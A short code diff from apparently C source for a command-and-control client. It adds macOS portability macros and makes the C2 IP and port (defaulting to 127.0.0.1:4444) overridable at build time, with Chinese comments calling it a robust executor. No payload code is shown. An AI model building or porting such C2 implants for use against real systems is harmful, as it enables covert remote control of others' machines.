@@ -29,11 +29,24 @@
     #include <signal.h>
     #include <fcntl.h>
     #include <sys/select.h>
+    #ifndef MSG_NOSIGNAL
+	#define MSG_NOSIGNAL 0 // macOS 不支持这个标志，所以设为0
+    #endif
+    #ifdef __APPLE__
+	#ifndef SO_NOSIGPIPE
+	    #define SO_NOSIGPIPE 0x1022
+	#endif
+    #endif
 #endif
 
 // 你可以根据需要修改 C2 的 IP 和端口
-#define C2_IP "127.0.0.1" 
-#define C2_PORT 4444
+#ifndef C2_IP
+    #define C2_IP "127.0.0.1"
+#endif
+#ifndef C2_PORT
+    #define C2_PORT 4444
+#endif
+
 #define BUF_SIZE 8192
 
 // --- 真正的正统执行器：防卡死、防断线完全体 ---
